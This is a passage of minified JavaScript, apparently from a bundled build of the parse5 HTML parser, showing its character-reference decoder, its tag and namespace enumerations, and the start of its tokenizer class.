e===ft.EQUALS||vx(e)}var dt;(function(e){e[e.EntityStart=0]="EntityStart",e[e.NumericStart=1]="NumericStart",e[e.NumericDecimal=2]="NumericDecimal",e[e.NumericHex=3]="NumericHex",e[e.NamedEntity=4]="NamedEntity"})(dt||(dt={}));var Rn;(function(e){e[e.Legacy=0]="Legacy",e[e.Strict=1]="Strict",e[e.Attribute=2]="Attribute"})(Rn||(Rn={}));class Ox{constructor(t,r,a){this.decodeTree=t,this.emitCodePoint=r,this.errors=a,this.state=dt.EntityStart,this.consumed=1,this.result=0,this.treeIndex=0,this.excess=1,this.decodeMode=Rn.Strict}startEntity(t){this.decodeMode=t,this.state=dt.EntityStart,this.result=0,this.treeIndex=0,this.excess=1,this.consumed=1}write(t,r){switch(this.state){case dt.EntityStart:return t.charCodeAt(r)===ft.NUM?(this.state=dt.NumericStart,this.consumed+=1,this.stateNumericStart(t,r+1)):(this.state=dt.NamedEntity,this.stateNamedEntity(t,r));case dt.NumericStart:return this.stateNumericStart(t,r);case dt.NumericDecimal:return this.stateNumericDecimal(t,r);case dt.NumericHex:return this.stateNumericHex(t,r);case dt.NamedEntity:return this.stateNamedEntity(t,r)}}stateNumericStart(t,r){return r>=t.length?-1:(t.charCodeAt(r)|Ix)===ft.LOWER_X?(this.state=dt.NumericHex,this.consumed+=1,this.stateNumericHex(t,r+1)):(this.state=dt.NumericDecimal,this.stateNumericDecimal(t,r))}addToNumericResult(t,r,a,o){if(r!==a){const s=a-r;this.result=this.result*Math.pow(o,s)+Number.parseInt(t.substr(r,s),o),this.consumed+=s}}stateNumericHex(t,r){const a=r;for(;r<t.length;){const o=t.charCodeAt(r);if(hc(o)||Nx(o))r+=1;else return this.addToNumericResult(t,a,r,16),this.emitNumericEntity(o,3)}return this.addToNumericResult(t,a,r,16),-1}stateNumericDecimal(t,r){const a=r;for(;r<t.length;){const o=t.charCodeAt(r);if(hc(o))r+=1;else return this.addToNumericResult(t,a,r,10),this.emitNumericEntity(o,2)}return this.addToNumericResult(t,a,r,10),-1}emitNumericEntity(t,r){var a;if(this.consumed<=r)return(a=this.errors)===null||a===void 0||a.absenceOfDigitsInNumericCharacterReference(this.consumed),0;if(t===ft.SEMI)this.consumed+=1;else if(this.decodeMode===Rn.Strict)return 0;return this.emitCodePoint(kx(this.result),this.consumed),this.errors&&(t!==ft.SEMI&&this.errors.missingSemicolonAfterCharacterReference(),this.errors.validateNumericCharacterReference(this.result)),this.consumed}stateNamedEntity(t,r){const{decodeTree:a}=this;let o=a[this.treeIndex],s=(o&ur.VALUE_LENGTH)>>14;for(;r<t.length;r++,this.excess++){const l=t.charCodeAt(r);if(this.treeIndex=Px(a,o,this.treeIndex+Math.max(1,s),l),this.treeIndex<0)return this.result===0||this.decodeMode===Rn.Attribute&&(s===0||Rx(l))?0:this.emitNotTerminatedNamedEntity();if(o=a[this.treeIndex],s=(o&ur.VALUE_LENGTH)>>14,s!==0){if(l===ft.SEMI)return this.emitNamedEntityData(this.treeIndex,s,this.consumed+this.excess);this.decodeMode!==Rn.Strict&&(this.result=this.treeIndex,this.consumed+=this.excess,this.excess=0)}}return-1}emitNotTerminatedNamedEntity(){var t;const{result:r,decodeTree:a}=this,o=(a[r]&ur.VALUE_LENGTH)>>14;return this.emitNamedEntityData(r,o,this.consumed),(t=this.errors)===null||t===void 0||t.missingSemicolonAfterCharacterReference(),this.consumed}emitNamedEntityData(t,r,a){const{decodeTree:o}=this;return this.emitCodePoint(r===1?o[t]&~ur.VALUE_LENGTH:o[t+1],a),r===3&&this.emitCodePoint(o[t+2],a),a}end(){var t;switch(this.state){case dt.NamedEntity:return this.result!==0&&(this.decodeMode!==Rn.Attribute||this.result===this.treeIndex)?this.emitNotTerminatedNamedEntity():0;case dt.NumericDecimal:return this.emitNumericEntity(0,2);case dt.NumericHex:return this.emitNumericEntity(0,3);case dt.NumericStart:return(t=this.errors)===null||t===void 0||t.absenceOfDigitsInNumericCharacterReference(this.consumed),0;case dt.EntityStart:return 0}}}function Px(e,t,r,a){const o=(t&ur.BRANCH_LENGTH)>>7,s=t&ur.JUMP_TABLE;if(o===0)return s!==0&&a===s?r:-1;if(s){const p=a-s;return p<0||p>=o?-1:e[r+p]-1}let l=r,h=l+o-1;for(;l<=h;){const p=l+h>>>1,g=e[p];if(g<a)l=p+1;else if(g>a)h=p-1;else return e[p+o]}return-1}var V;(function(e){e.HTML="http://www.w3.org/1999/xhtml",e.MATHML="http://www.w3.org/1998/Math/MathML",e.SVG="http://www.w3.org/2000/svg",e.XLINK="http://www.w3.org/1999/xlink",e.XML="http://www.w3.org/XML/1998/namespace",e.XMLNS="http://www.w3.org/2000/xmlns/"})(V||(V={}));var Nr;(function(e){e.TYPE="type",e.ACTION="action",e.ENCODING="encoding",e.PROMPT="prompt",e.NAME="name",e.COLOR="color",e.FACE="face",e.SIZE="size"})(Nr||(Nr={}));var Kt;(function(e){e.NO_QUIRKS="no-quirks",e.QUIRKS="quirks",e.LIMITED_QUIRKS="limited-quirks"})(Kt||(Kt={}));var M;(function(e){e.A="a",e.ADDRESS="address",e.ANNOTATION_XML="annotation-xml",e.APPLET="applet",e.AREA="area",e.ARTICLE="article",e.ASIDE="aside",e.B="b",e.BASE="base",e.BASEFONT="basefont",e.BGSOUND="bgsound",e.BIG="big",e.BLOCKQUOTE="blockquote",e.BODY="body",e.BR="br",e.BUTTON="button",e.CAPTION="caption",e.CENTER="center",e.CODE="code",e.COL="col",e.COLGROUP="colgroup",e.DD="dd",e.DESC="desc",e.DETAILS="details",e.DIALOG="dialog",e.DIR="dir",e.DIV="div",e.DL="dl",e.DT="dt",e.EM="em",e.EMBED="embed",e.FIELDSET="fieldset",e.FIGCAPTION="figcaption",e.FIGURE="figure",e.FONT="font",e.FOOTER="footer",e.FOREIGN_OBJECT="foreignObject",e.FORM="form",e.FRAME="frame",e.FRAMESET="frameset",e.H1="h1",e.H2="h2",e.H3="h3",e.H4="h4",e.H5="h5",e.H6="h6",e.HEAD="head",e.HEADER="header",e.HGROUP="hgroup",e.HR="hr",e.HTML="html",e.I="i",e.IMG="img",e.IMAGE="image",e.INPUT="input",e.IFRAME="iframe",e.KEYGEN="keygen",e.LABEL="label",e.LI="li",e.LINK="link",e.LISTING="listing",e.MAIN="main",e.MALIGNMARK="malignmark",e.MARQUEE="marquee",e.MATH="math",e.MENU="menu",e.META="meta",e.MGLYPH="mglyph",e.MI="mi",e.MO="mo",e.MN="mn",e.MS="ms",e.MTEXT="mtext",e.NAV="nav",e.NOBR="nobr",e.NOFRAMES="noframes",e.NOEMBED="noembed",e.NOSCRIPT="noscript",e.OBJECT="object",e.OL="ol",e.OPTGROUP="optgroup",e.OPTION="option",e.P="p",e.PARAM="param",e.PLAINTEXT="plaintext",e.PRE="pre",e.RB="rb",e.RP="rp",e.RT="rt",e.RTC="rtc",e.RUBY="ruby",e.S="s",e.SCRIPT="script",e.SEARCH="search",e.SECTION="section",e.SELECT="select",e.SOURCE="source",e.SMALL="small",e.SPAN="span",e.STRIKE="strike",e.STRONG="strong",e.STYLE="style",e.SUB="sub",e.SUMMARY="summary",e.SUP="sup",e.TABLE="table",e.TBODY="tbody",e.TEMPLATE="template",e.TEXTAREA="textarea",e.TFOOT="tfoot",e.TD="td",e.TH="th",e.THEAD="thead",e.TITLE="title",e.TR="tr",e.TRACK="track",e.TT="tt",e.U="u",e.UL="ul",e.SVG="svg",e.VAR="var",e.WBR="wbr",e.XMP="xmp"})(M||(M={}));var d;(function(e){e[e.UNKNOWN=0]="UNKNOWN",e[e.A=1]="A",e[e.ADDRESS=2]="ADDRESS",e[e.ANNOTATION_XML=3]="ANNOTATION_XML",e[e.APPLET=4]="APPLET",e[e.AREA=5]="AREA",e[e.ARTICLE=6]="ARTICLE",e[e.ASIDE=7]="ASIDE",e[e.B=8]="B",e[e.BASE=9]="BASE",e[e.BASEFONT=10]="BASEFONT",e[e.BGSOUND=11]="BGSOUND",e[e.BIG=12]="BIG",e[e.BLOCKQUOTE=13]="BLOCKQUOTE",e[e.BODY=14]="BODY",e[e.BR=15]="BR",e[e.BUTTON=16]="BUTTON",e[e.CAPTION=17]="CAPTION",e[e.CENTER=18]="CENTER",e[e.CODE=19]="CODE",e[e.COL=20]="COL",e[e.COLGROUP=21]="COLGROUP",e[e.DD=22]="DD",e[e.DESC=23]="DESC",e[e.DETAILS=24]="DETAILS",e[e.DIALOG=25]="DIALOG",e[e.DIR=26]="DIR",e[e.DIV=27]="DIV",e[e.DL=28]="DL",e[e.DT=29]="DT",e[e.EM=30]="EM",e[e.EMBED=31]="EMBED",e[e.FIELDSET=32]="FIELDSET",e[e.FIGCAPTION=33]="FIGCAPTION",e[e.FIGURE=34]="FIGURE",e[e.FONT=35]="FONT",e[e.FOOTER=36]="FOOTER",e[e.FOREIGN_OBJECT=37]="FOREIGN_OBJECT",e[e.FORM=38]="FORM",e[e.FRAME=39]="FRAME",e[e.FRAMESET=40]="FRAMESET",e[e.H1=41]="H1",e[e.H2=42]="H2",e[e.H3=43]="H3",e[e.H4=44]="H4",e[e.H5=45]="H5",e[e.H6=46]="H6",e[e.HEAD=47]="HEAD",e[e.HEADER=48]="HEADER",e[e.HGROUP=49]="HGROUP",e[e.HR=50]="HR",e[e.HTML=51]="HTML",e[e.I=52]="I",e[e.IMG=53]="IMG",e[e.IMAGE=54]="IMAGE",e[e.INPUT=55]="INPUT",e[e.IFRAME=56]="IFRAME",e[e.KEYGEN=57]="KEYGEN",e[e.LABEL=58]="LABEL",e[e.LI=59]="LI",e[e.LINK=60]="LINK",e[e.LISTING=61]="LISTING",e[e.MAIN=62]="MAIN",e[e.MALIGNMARK=63]="MALIGNMARK",e[e.MARQUEE=64]="MARQUEE",e[e.MATH=65]="MATH",e[e.MENU=66]="MENU",e[e.META=67]="META",e[e.MGLYPH=68]="MGLYPH",e[e.MI=69]="MI",e[e.MO=70]="MO",e[e.MN=71]="MN",e[e.MS=72]="MS",e[e.MTEXT=73]="MTEXT",e[e.NAV=74]="NAV",e[e.NOBR=75]="NOBR",e[e.NOFRAMES=76]="NOFRAMES",e[e.NOEMBED=77]="NOEMBED",e[e.NOSCRIPT=78]="NOSCRIPT",e[e.OBJECT=79]="OBJECT",e[e.OL=80]="OL",e[e.OPTGROUP=81]="OPTGROUP",e[e.OPTION=82]="OPTION",e[e.P=83]="P",e[e.PARAM=84]="PARAM",e[e.PLAINTEXT=85]="PLAINTEXT",e[e.PRE=86]="PRE",e[e.RB=87]="RB",e[e.RP=88]="RP",e[e.RT=89]="RT",e[e.RTC=90]="RTC",e[e.RUBY=91]="RUBY",e[e.S=92]="S",e[e.SCRIPT=93]="SCRIPT",e[e.SEARCH=94]="SEARCH",e[e.SECTION=95]="SECTION",e[e.SELECT=96]="SELECT",e[e.SOURCE=97]="SOURCE",e[e.SMALL=98]="SMALL",e[e.SPAN=99]="SPAN",e[e.STRIKE=100]="STRIKE",e[e.STRONG=101]="STRONG",e[e.STYLE=102]="STYLE",e[e.SUB=103]="SUB",e[e.SUMMARY=104]="SUMMARY",e[e.SUP=105]="SUP",e[e.TABLE=106]="TABLE",e[e.TBODY=107]="TBODY",e[e.TEMPLATE=108]="TEMPLATE",e[e.TEXTAREA=109]="TEXTAREA",e[e.TFOOT=110]="TFOOT",e[e.TD=111]="TD",e[e.TH=112]="TH",e[e.THEAD=113]="THEAD",e[e.TITLE=114]="TITLE",e[e.TR=115]="TR",e[e.TRACK=116]="TRACK",e[e.TT=117]="TT",e[e.U=118]="U",e[e.UL=119]="UL",e[e.SVG=120]="SVG",e[e.VAR=121]="VAR",e[e.WBR=122]="WBR",e[e.XMP=123]="XMP"})(d||(d={}));const wx=new Map([[M.A,d.A],[M.ADDRESS,d.ADDRESS],[M.ANNOTATION_XML,d.ANNOTATION_XML],[M.APPLET,d.APPLET],[M.AREA,d.AREA],[M.ARTICLE,d.ARTICLE],[M.ASIDE,d.ASIDE],[M.B,d.B],[M.BASE,d.BASE],[M.BASEFONT,d.BASEFONT],[M.BGSOUND,d.BGSOUND],[M.BIG,d.BIG],[M.BLOCKQUOTE,d.BLOCKQUOTE],[M.BODY,d.BODY],[M.BR,d.BR],[M.BUTTON,d.BUTTON],[M.CAPTION,d.CAPTION],[M.CENTER,d.CENTER],[M.CODE,d.CODE],[M.COL,d.COL],[M.COLGROUP,d.COLGROUP],[M.DD,d.DD],[M.DESC,d.DESC],[M.DETAILS,d.DETAILS],[M.DIALOG,d.DIALOG],[M.DIR,d.DIR],[M.DIV,d.DIV],[M.DL,d.DL],[M.DT,d.DT],[M.EM,d.EM],[M.EMBED,d.EMBED],[M.FIELDSET,d.FIELDSET],[M.FIGCAPTION,d.FIGCAPTION],[M.FIGURE,d.FIGURE],[M.FONT,d.FONT],[M.FOOTER,d.FOOTER],[M.FOREIGN_OBJECT,d.FOREIGN_OBJECT],[M.FORM,d.FORM],[M.FRAME,d.FRAME],[M.FRAMESET,d.FRAMESET],[M.H1,d.H1],[M.H2,d.H2],[M.H3,d.H3],[M.H4,d.H4],[M.H5,d.H5],[M.H6,d.H6],[M.HEAD,d.HEAD],[M.HEADER,d.HEADER],[M.HGROUP,d.HGROUP],[M.HR,d.HR],[M.HTML,d.HTML],[M.I,d.I],[M.IMG,d.IMG],[M.IMAGE,d.IMAGE],[M.INPUT,d.INPUT],[M.IFRAME,d.IFRAME],[M.KEYGEN,d.KEYGEN],[M.LABEL,d.LABEL],[M.LI,d.LI],[M.LINK,d.LINK],[M.LISTING,d.LISTING],[M.MAIN,d.MAIN],[M.MALIGNMARK,d.MALIGNMARK],[M.MARQUEE,d.MARQUEE],[M.MATH,d.MATH],[M.MENU,d.MENU],[M.META,d.META],[M.MGLYPH,d.MGLYPH],[M.MI,d.MI],[M.MO,d.MO],[M.MN,d.MN],[M.MS,d.MS],[M.MTEXT,d.MTEXT],[M.NAV,d.NAV],[M.NOBR,d.NOBR],[M.NOFRAMES,d.NOFRAMES],[M.NOEMBED,d.NOEMBED],[M.NOSCRIPT,d.NOSCRIPT],[M.OBJECT,d.OBJECT],[M.OL,d.OL],[M.OPTGROUP,d.OPTGROUP],[M.OPTION,d.OPTION],[M.P,d.P],[M.PARAM,d.PARAM],[M.PLAINTEXT,d.PLAINTEXT],[M.PRE,d.PRE],[M.RB,d.RB],[M.RP,d.RP],[M.RT,d.RT],[M.RTC,d.RTC],[M.RUBY,d.RUBY],[M.S,d.S],[M.SCRIPT,d.SCRIPT],[M.SEARCH,d.SEARCH],[M.SECTION,d.SECTION],[M.SELECT,d.SELECT],[M.SOURCE,d.SOURCE],[M.SMALL,d.SMALL],[M.SPAN,d.SPAN],[M.STRIKE,d.STRIKE],[M.STRONG,d.STRONG],[M.STYLE,d.STYLE],[M.SUB,d.SUB],[M.SUMMARY,d.SUMMARY],[M.SUP,d.SUP],[M.TABLE,d.TABLE],[M.TBODY,d.TBODY],[M.TEMPLATE,d.TEMPLATE],[M.TEXTAREA,d.TEXTAREA],[M.TFOOT,d.TFOOT],[M.TD,d.TD],[M.TH,d.TH],[M.THEAD,d.THEAD],[M.TITLE,d.TITLE],[M.TR,d.TR],[M.TRACK,d.TRACK],[M.TT,d.TT],[M.U,d.U],[M.UL,d.UL],[M.SVG,d.SVG],[M.VAR,d.VAR],[M.WBR,d.WBR],[M.XMP,d.XMP]]);function Ci(e){var t;return(t=wx.get(e))!==null&&t!==void 0?t:d.UNKNOWN}const K=d,Dx={[V.HTML]:new Set([K.ADDRESS,K.APPLET,K.AREA,K.ARTICLE,K.ASIDE,K.BASE,K.BASEFONT,K.BGSOUND,K.BLOCKQUOTE,K.BODY,K.BR,K.BUTTON,K.CAPTION,K.CENTER,K.COL,K.COLGROUP,K.DD,K.DETAILS,K.DIR,K.DIV,K.DL,K.DT,K.EMBED,K.FIELDSET,K.FIGCAPTION,K.FIGURE,K.FOOTER,K.FORM,K.FRAME,K.FRAMESET,K.H1,K.H2,K.H3,K.H4,K.H5,K.H6,K.HEAD,K.HEADER,K.HGROUP,K.HR,K.HTML,K.IFRAME,K.IMG,K.INPUT,K.LI,K.LINK,K.LISTING,K.MAIN,K.MARQUEE,K.MENU,K.META,K.NAV,K.NOEMBED,K.NOFRAMES,K.NOSCRIPT,K.OBJECT,K.OL,K.P,K.PARAM,K.PLAINTEXT,K.PRE,K.SCRIPT,K.SECTION,K.SELECT,K.SOURCE,K.STYLE,K.SUMMARY,K.TABLE,K.TBODY,K.TD,K.TEMPLATE,K.TEXTAREA,K.TFOOT,K.TH,K.THEAD,K.TITLE,K.TR,K.TRACK,K.UL,K.WBR,K.XMP]),[V.MATHML]:new Set([K.MI,K.MO,K.MN,K.MS,K.MTEXT,K.ANNOTATION_XML]),[V.SVG]:new Set([K.TITLE,K.FOREIGN_OBJECT,K.DESC]),[V.XLINK]:new Set,[V.XML]:new Set,[V.XMLNS]:new Set},pc=new Set([K.H1,K.H2,K.H3,K.H4,K.H5,K.H6]);M.STYLE,M.SCRIPT,M.XMP,M.IFRAME,M.NOEMBED,M.NOFRAMES,M.PLAINTEXT;var x;(function(e){e[e.DATA=0]="DATA",e[e.RCDATA=1]="RCDATA",e[e.RAWTEXT=2]="RAWTEXT",e[e.SCRIPT_DATA=3]="SCRIPT_DATA",e[e.PLAINTEXT=4]="PLAINTEXT",e[e.TAG_OPEN=5]="TAG_OPEN",e[e.END_TAG_OPEN=6]="END_TAG_OPEN",e[e.TAG_NAME=7]="TAG_NAME",e[e.RCDATA_LESS_THAN_SIGN=8]="RCDATA_LESS_THAN_SIGN",e[e.RCDATA_END_TAG_OPEN=9]="RCDATA_END_TAG_OPEN",e[e.RCDATA_END_TAG_NAME=10]="RCDATA_END_TAG_NAME",e[e.RAWTEXT_LESS_THAN_SIGN=11]="RAWTEXT_LESS_THAN_SIGN",e[e.RAWTEXT_END_TAG_OPEN=12]="RAWTEXT_END_TAG_OPEN",e[e.RAWTEXT_END_TAG_NAME=13]="RAWTEXT_END_TAG_NAME",e[e.SCRIPT_DATA_LESS_THAN_SIGN=14]="SCRIPT_DATA_LESS_THAN_SIGN",e[e.SCRIPT_DATA_END_TAG_OPEN=15]="SCRIPT_DATA_END_TAG_OPEN",e[e.SCRIPT_DATA_END_TAG_NAME=16]="SCRIPT_DATA_END_TAG_NAME",e[e.SCRIPT_DATA_ESCAPE_START=17]="SCRIPT_DATA_ESCAPE_START",e[e.SCRIPT_DATA_ESCAPE_START_DASH=18]="SCRIPT_DATA_ESCAPE_START_DASH",e[e.SCRIPT_DATA_ESCAPED=19]="SCRIPT_DATA_ESCAPED",e[e.SCRIPT_DATA_ESCAPED_DASH=20]="SCRIPT_DATA_ESCAPED_DASH",e[e.SCRIPT_DATA_ESCAPED_DASH_DASH=21]="SCRIPT_DATA_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN=22]="SCRIPT_DATA_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_OPEN=23]="SCRIPT_DATA_ESCAPED_END_TAG_OPEN",e[e.SCRIPT_DATA_ESCAPED_END_TAG_NAME=24]="SCRIPT_DATA_ESCAPED_END_TAG_NAME",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_START=25]="SCRIPT_DATA_DOUBLE_ESCAPE_START",e[e.SCRIPT_DATA_DOUBLE_ESCAPED=26]="SCRIPT_DATA_DOUBLE_ESCAPED",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH=27]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH=28]="SCRIPT_DATA_DOUBLE_ESCAPED_DASH_DASH",e[e.SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN=29]="SCRIPT_DATA_DOUBLE_ESCAPED_LESS_THAN_SIGN",e[e.SCRIPT_DATA_DOUBLE_ESCAPE_END=30]="SCRIPT_DATA_DOUBLE_ESCAPE_END",e[e.BEFORE_ATTRIBUTE_NAME=31]="BEFORE_ATTRIBUTE_NAME",e[e.ATTRIBUTE_NAME=32]="ATTRIBUTE_NAME",e[e.AFTER_ATTRIBUTE_NAME=33]="AFTER_ATTRIBUTE_NAME",e[e.BEFORE_ATTRIBUTE_VALUE=34]="BEFORE_ATTRIBUTE_VALUE",e[e.ATTRIBUTE_VALUE_DOUBLE_QUOTED=35]="ATTRIBUTE_VALUE_DOUBLE_QUOTED",e[e.ATTRIBUTE_VALUE_SINGLE_QUOTED=36]="ATTRIBUTE_VALUE_SINGLE_QUOTED",e[e.ATTRIBUTE_VALUE_UNQUOTED=37]="ATTRIBUTE_VALUE_UNQUOTED",e[e.AFTER_ATTRIBUTE_VALUE_QUOTED=38]="AFTER_ATTRIBUTE_VALUE_QUOTED",e[e.SELF_CLOSING_START_TAG=39]="SELF_CLOSING_START_TAG",e[e.BOGUS_COMMENT=40]="BOGUS_COMMENT",e[e.MARKUP_DECLARATION_OPEN=41]="MARKUP_DECLARATION_OPEN",e[e.COMMENT_START=42]="COMMENT_START",e[e.COMMENT_START_DASH=43]="COMMENT_START_DASH",e[e.COMMENT=44]="COMMENT",e[e.COMMENT_LESS_THAN_SIGN=45]="COMMENT_LESS_THAN_SIGN",e[e.COMMENT_LESS_THAN_SIGN_BANG=46]="COMMENT_LESS_THAN_SIGN_BANG",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH=47]="COMMENT_LESS_THAN_SIGN_BANG_DASH",e[e.COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH=48]="COMMENT_LESS_THAN_SIGN_BANG_DASH_DASH",e[e.COMMENT_END_DASH=49]="COMMENT_END_DASH",e[e.COMMENT_END=50]="COMMENT_END",e[e.COMMENT_END_BANG=51]="COMMENT_END_BANG",e[e.DOCTYPE=52]="DOCTYPE",e[e.BEFORE_DOCTYPE_NAME=53]="BEFORE_DOCTYPE_NAME",e[e.DOCTYPE_NAME=54]="DOCTYPE_NAME",e[e.AFTER_DOCTYPE_NAME=55]="AFTER_DOCTYPE_NAME",e[e.AFTER_DOCTYPE_PUBLIC_KEYWORD=56]="AFTER_DOCTYPE_PUBLIC_KEYWORD",e[e.BEFORE_DOCTYPE_PUBLIC_IDENTIFIER=57]="BEFORE_DOCTYPE_PUBLIC_IDENTIFIER",e[e.DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED=58]="DOCTYPE_PUBLIC_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED=59]="DOCTYPE_PUBLIC_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_PUBLIC_IDENTIFIER=60]="AFTER_DOCTYPE_PUBLIC_IDENTIFIER",e[e.BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS=61]="BETWEEN_DOCTYPE_PUBLIC_AND_SYSTEM_IDENTIFIERS",e[e.AFTER_DOCTYPE_SYSTEM_KEYWORD=62]="AFTER_DOCTYPE_SYSTEM_KEYWORD",e[e.BEFORE_DOCTYPE_SYSTEM_IDENTIFIER=63]="BEFORE_DOCTYPE_SYSTEM_IDENTIFIER",e[e.DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED=64]="DOCTYPE_SYSTEM_IDENTIFIER_DOUBLE_QUOTED",e[e.DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED=65]="DOCTYPE_SYSTEM_IDENTIFIER_SINGLE_QUOTED",e[e.AFTER_DOCTYPE_SYSTEM_IDENTIFIER=66]="AFTER_DOCTYPE_SYSTEM_IDENTIFIER",e[e.BOGUS_DOCTYPE=67]="BOGUS_DOCTYPE",e[e.CDATA_SECTION=68]="CDATA_SECTION",e[e.CDATA_SECTION_BRACKET=69]="CDATA_SECTION_BRACKET",e[e.CDATA_SECTION_END=70]="CDATA_SECTION_END",e[e.CHARACTER_REFERENCE=71]="CHARACTER_REFERENCE",e[e.AMBIGUOUS_AMPERSAND=72]="AMBIGUOUS_AMPERSAND"})(x||(x={}));const tt={DATA:x.DATA,RCDATA:x.RCDATA,RAWTEXT:x.RAWTEXT,SCRIPT_DATA:x.SCRIPT_DATA,PLAINTEXT:x.PLAINTEXT,CDATA_SECTION:x.CDATA_SECTION};function Mx(e){return e>=y.DIGIT_0&&e<=y.DIGIT_9}function ba(e){return e>=y.LATIN_CAPITAL_A&&e<=y.LATIN_CAPITAL_Z}function Fx(e){return e>=y.LATIN_SMALL_A&&e<=y.LATIN_SMALL_Z}function rr(e){return Fx(e)||ba(e)}function Mh(e){return rr(e)||Mx(e)}function uo(e){return e+32}function gm(e){return e===y.SPACE||e===y.LINE_FEED||e===y.TABULATION||e===y.FORM_FEED}function Fh(e){return gm(e)||e===y.SOLIDUS||e===y.GREATER_THAN_SIGN}function Bx(e){return e===y.NULL?W.nullCharacterReference:e>1114111?W.characterReferenceOutsideUnicodeRange:fm(e)?W.surrogateCharacterReference:pm(e)?W.noncharacterCharacterReference:hm(e)||e===y.CARRIAGE_RETURN?W.controlCharacterReference:null}class Hx{constructor(t,r){this.options=t,this.handler=r,this.paused=!1,this.inLoop=!1,this.inForeignNode=!1,this.lastStartTagName="",this.active=!1,this.state=x.DATA,this.returnState=x.DATA,this.entityStartPos=0,this.consumedAfterSnapshot=-1,this.currentCharacterToken=null,this.currentToken=null,this.currentAttr={name:"",value:""},this.preprocessor=new xx(r),this.currentLocation=this.getCurrentLocation(-1),this.entityDecoder=new Ox(Ax,(a,o)=>{this.preprocessor.pos=this.entityStartPos+o-1,this._flushCodePointConsumedAsCharacterReference(a)},r.onParseError?{missingSemicolonAfterCharacterReference:()=>{this._err(W.missingSemicolonAfterCharacterReference,1)},absenceOfDigitsInNumericCharacterReference:a=>{this._err(W.absenceOfDigitsInNumericCharacterReference,this.entityStartPos-this.preprocessor.pos+a)},validateNumericCharacterReference:a=>{const o=Bx(a);o&&this._err(o,1)}}:void 0)}_err(t,r=0){var a,o;(o=(a=this.handler).onParseError)===null||o===void 0||o.call(a,this.preprocessor.getError(t,r))}getCurrentLocation(t){return this.options.sourceCodeLocationInfo?{startLine:this.preprocessor.line,startCol:this.preprocessor.col-t,startOffset:this.preprocessor.offset-t,endLine:-1,endCol:-1,endOffset:-1}:null}_runParsingLoop(){if(!this.inLoop){for(this.inLoop=!0;this.active&&!this.paused;){this.consumedAfterSnapshot=0;const t=this._consume();this._ensureHibernation()||this._callState(t)}this.inLoop=!1}}pause(){this.paused=!0}resume(t){if(!this.paused)throw new Error("Parser was already resumed");this.paused=!1,!this.inLoop&&(this._runParsingLoop(),this.paused||t?.())}write(t,r,a){this.active=!0,this.preprocessor.write(t,r),this._runParsingLoop(),this.paused||a?.()}insertHtmlAtCurrentPos(t){this.active=!0,this.preprocessor.insertHtmlAtCurrentPos(t),this._runParsingLoop()}_ensureHibernation(){return this.preprocessor.endOfChunkHit?(this.preprocessor.retreat(this.consumedAfterSnapshot),this.consumedAfterSnapshot=0,this.active=!1,!0):!1}_consume(){return this.consumedAfterSnapshot++,this.preprocessor.advance()}_advanceBy(t){this.consumedAfterSnapshot+=t;for(let r=0;r<t;r++)this.preprocessor.advance()}_consumeSequenceIfMatch(t,r){return this.preprocessor.startsWith(t,r)?(this._advanceBy(t.length-1),!0):!1}_createStartTagToken(){this.currentToken={type:Pe.START_TAG,tagName:"",tagID:d.UNKNOWN,selfClosing:!1,ackSelfClosing:!1,attrs:[],location:this.getCurrentLocation(1)}}_createEndTagToken(){this.currentToken={type:Pe.END_TAG,tagName:"",tagID:d.UNKNOWN,selfClosing:!1,ackSelfClosing:!1,attrs:[],location:this.getCurrentLocation(2)}}_createCommentToken(t){this.currentToken={type:Pe.COMMENT,data:"",location:this.getCurrentLocation(t)}}_createDoctypeToken(t){this.currentToken={type:Pe.DOCTYPE,name:t,forceQuirks:!1,publicId:null,systemId:null,location:this.currentLocation}}_createCharacterToken(t,r){this.currentCharacterToken={type:t,chars:r,location:this.currentLocation}}_createAttr(t){this.currentAttr={name:t,value:""},this.currentLocation=this.getCurrentLocation(0)}_leaveAttrName(){var t,r;const a=this.currentToken;if(mm(a,this.currentAttr.name)===null){if(a.attrs.push(this.currentAttr),a.location&&this.currentLocation){const o=(t=(r=a.location).attrs)!==null&&t!==void 0?t:r.attrs=Object.create(null);o[this.currentAttr.name]=this.currentLocation,this._leaveAttrValue()}}else this._err(W.duplicateAttribute)}_leaveAttrValue(){this.currentLocation&&(this.currentLocation.endLine=this.preprocessor.line,this.currentLocation.endCol=this.preprocessor.col,this.currentLocation.endOffset=this.preprocessor.offset)}prepareToken(t){this._emitCurrentCharacterToken(t.location),this.currentToken=null,t.location&&(t.location.endLine=this.preprocessor.line,t.location.endCol=this.preprocessor.col+1,t.location.endOffset=this.preprocessor.offset+1),this.currentLocation=this.getCurrentLocation(-1)}emitCurrentTagToken(){const t=this.currentToken;this.prepareToken(t),t.tagID=Ci(t.tagName),t.type===Pe.START_TAG?(this.lastStartTagName=t.tagName,this.handler.onStartTag(t)):(t.attrs.length>0&&this._err(W.endTagWithAttributes),t.selfClosing&&this._err(W.endTagWithTrailingSolidus),this.handler.onEndTag(t)),this.preprocessor.dropParsedChunk()}emitCurrentComment(t){this.prepareToken(t),this.handler.onComment(t),this.preprocessor.dropParsedChunk()}emitCurrentDoctype(t){this.prepareToken(t),this.handler.onDoctype(t),this.preprocessor.dropParsedChunk()}_emitCurrentCharacterToken(t){if(this.currentCharacterToken){switch(t&&this.currentCharacterToken.location&&(this.currentCharacterToken.location.endLine=t.startLine,this.currentCharacterToken.location.endCol=t.startCol,this.currentCharacterToken.location.endOffset=t.startOffset),this.currentCharacterToken.type){case 